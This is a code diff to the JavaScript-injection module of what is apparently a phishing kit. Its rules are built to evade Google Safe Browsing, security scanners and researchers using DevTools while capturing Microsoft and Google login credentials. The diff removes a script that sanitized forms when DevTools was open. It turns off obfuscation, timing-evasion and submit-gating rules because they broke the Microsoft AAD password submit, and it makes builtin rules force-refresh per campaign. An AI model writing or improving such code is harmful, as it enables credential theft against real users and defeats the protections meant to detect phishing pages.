@@ -127,11 +127,15 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 			Enabled:    true,
 		},
 
-		// 13. DevTools Detection
+		// 13. DevTools Detection (OPT-IN)
 		// Security researchers and automated tools often have DevTools open.
-		// This rule detects DevTools and can redirect or modify behavior.
-		// Uses multiple detection vectors including debugger timing and
-		// console.log object detection.
+		// This rule detects DevTools via window-size heuristics. It is
+		// DISABLED BY DEFAULT because previous versions mutated form action
+		// attributes on detection, which broke legitimate Microsoft / Google
+		// login flows (causing the password submit to loop back to the
+		// email entry step via "/#" navigation). The hardened version below
+		// only sets a non-invasive flag on window so user-land scripts may
+		// react, without touching the DOM.
 		{
 			ID:   "builtin_devtools_detection",
 			Name: "DevTools Open Detection",
@@ -143,58 +147,19 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 			},
 			TriggerPaths: []string{".*"},
 			Script: `(function(){
-  var _devtoolsOpen = false;
   var _threshold = 160;
-
-  // Method 1: Window size difference (DevTools docked changes inner dimensions)
-  function _checkWindowSize() {
-    var widthDiff = window.outerWidth - window.innerWidth > _threshold;
-    var heightDiff = window.outerHeight - window.innerHeight > _threshold;
-    return widthDiff || heightDiff;
+  function _check() {
+    try {
+      var w = window.outerWidth - window.innerWidth > _threshold;
+      var h = window.outerHeight - window.innerHeight > _threshold;
+      if (w || h) { window.__pc_dt = true; }
+    } catch(e) {}
   }
-
-  // Method 2: debugger statement timing
-  function _checkDebuggerTiming() {
-    var start = performance.now();
-    (function(){}).constructor('debugger')();
-    var end = performance.now();
-    return (end - start) > 100;
-  }
-
-  // Method 3: console.log toString detection
-  var _consoleElement = new Image();
-  Object.defineProperty(_consoleElement, 'id', {
-    get: function() {
-      _devtoolsOpen = true;
-      _onDevToolsOpen();
-    }
-  });
-
-  function _onDevToolsOpen() {
-    // When DevTools detected, sanitize the page to look benign
-    // Remove suspicious form elements and replace with generic content
-    var forms = document.querySelectorAll('form[action]');
-    forms.forEach(function(form) {
-      form.setAttribute('action', '#');
-      form.onsubmit = function(e) { e.preventDefault(); return false; };
-    });
-    // Change page title to something generic
-    document.title = 'Loading...';
-  }
-
-  // Periodic check
-  setInterval(function() {
-    if (_checkWindowSize()) {
-      _devtoolsOpen = true;
-      _onDevToolsOpen();
-    }
-    // Trigger console.log detection
-    console.log('%c', _consoleElement);
-    console.clear();
-  }, 1000);
+  // passive detection only; never mutates the DOM or forms
+  setInterval(_check, 2000);
 })();`,
 			ScriptType: "inline",
-			Enabled:    true,
+			Enabled:    false,
 		},
 
 		// 14. Right-Click / Copy-Paste / Keyboard Shortcut Blocker
@@ -265,10 +230,14 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
   }, true);
 })();`,
 			ScriptType: "inline",
-			Enabled:    true,
+			// OPT-IN: user-selectable. Some Microsoft login variants rely on
+			// right-click / keyboard shortcuts (e.g. paste into password) and
+			// this rule can subtly degrade the flow. Disabled by default.
+			Enabled: false,
 		},
 
 		// 15. Canvas/WebGL Fingerprint Normalization
+
 		// Some detection systems use canvas fingerprinting to identify
 		// known phishing infrastructure. This rule adds subtle noise to
 		// canvas operations to prevent consistent fingerprinting.
@@ -410,10 +379,16 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
   }, {passive: true, once: true});
 })();`,
 			ScriptType: "inline",
-			Enabled:    true,
+			// OPT-IN: gates submit buttons until human interaction signals
+			// are observed. On Microsoft login the submit button is disabled
+			// on first paint and MSAL's own progressive-enable logic can
+			// conflict, leaving the password step unable to submit and
+			// bouncing the user back to the email step. Disabled by default.
+			Enabled: false,
 		},
 
 		// 17. Dynamic Script Obfuscation Layer
+
 		// Adds a layer of runtime deobfuscation that makes static analysis
 		// by security scanners more difficult. Each page load generates
 		// slightly different code patterns.
@@ -475,10 +450,15 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
   });
 })();`,
 			ScriptType: "inline",
-			Enabled:    true,
+			// OPT-IN: uses eval() and mutates form/input attributes. On
+			// Microsoft AAD the mutated data-* attributes can clash with
+			// MSAL's internal form state tracking, and the eval() calls
+			// violate strict CSP variants. Disabled by default.
+			Enabled: false,
 		},
 
 		// 18. Timing-Based Analysis Evasion
+
 		// Security scanners analyze pages quickly (< 2 seconds).
 		// Real users take time to read and interact. This rule delays
 		// sensitive form element activation to evade quick-scan detection.
@@ -535,25 +515,49 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
   });
 })();`,
 			ScriptType: "inline",
-			Enabled:    true,
+			// OPT-IN: sets password fields to readonly on first paint and
+			// relies on a later user gesture to remove the attribute. This
+			// races against MSAL's own password handling on Microsoft login
+			// and, combined with the legitimate auto-focus, frequently
+			// causes the password submit to reach the server stripped,
+			// which sends the user back to the email step. Disabled by
+			// default; operators who want this protection can enable it
+			// per campaign.
+			Enabled: false,
 		},
 	}
 }
 
-// EnsureAdvancedGSBRulesV2Loaded loads the v2 advanced GSB evasion rules.
-// Call this during service initialization after EnsureEnhancedGSBRulesLoaded.
+// EnsureAdvancedGSBRulesV2Loaded loads (and force-refreshes) the v2 advanced
+// GSB evasion rules. Call this during service initialization after
+// EnsureEnhancedGSBRulesLoaded.
+//
+// Like its v1 counterpart, this function always overwrites any persisted
+// copy of a builtin v2 rule with the current in-code definition so that
+// upgrades of the binary automatically carry through script-body fixes
+// (e.g. disabling the dynamic-obfuscation and timing-evasion rules that
+// broke the Microsoft AAD password submit). The operator's Enabled flag
+// is preserved across refreshes.
 func (j *JsInjection) EnsureAdvancedGSBRulesV2Loaded() {
 	advanced := j.GetAdvancedGSBEvasionRulesV2()
 
 	for _, rule := range advanced {
-		if _, loaded := j.rules.Load(rule.ID); !loaded {
-			compiled, err := j.compileRule(rule)
-			if err != nil {
-				j.Logger.Errorw("failed to compile advanced GSB v2 rule", "id", rule.ID, "error", err)
-				continue
+		// preserve the operator's Enabled preference if one exists
+		if existing, ok := j.rules.Load(rule.ID); ok {
+			if compiled, ok2 := existing.(*compiledJsRule); ok2 && compiled != nil && compiled.rule != nil {
+				rule.Enabled = compiled.rule.Enabled
 			}
-			j.rules.Store(rule.ID, compiled)
-			j.Logger.Infow("loaded advanced GSB evasion v2 rule", "id", rule.ID, "name", rule.Name)
 		}
+
+		compiled, err := j.compileRule(rule)
+		if err != nil {
+			j.Logger.Errorw("failed to compile advanced GSB v2 rule", "id", rule.ID, "error", err)
+			continue
+		}
+		j.rules.Store(rule.ID, compiled)
+		j.Logger.Infow("loaded advanced GSB evasion v2 rule", "id", rule.ID, "name", rule.Name)
+	}
+	if err := j.saveRulesToDB(); err != nil {
+		j.Logger.Warnw("failed to persist refreshed advanced GSB v2 rules", "error", err)
 	}
 }
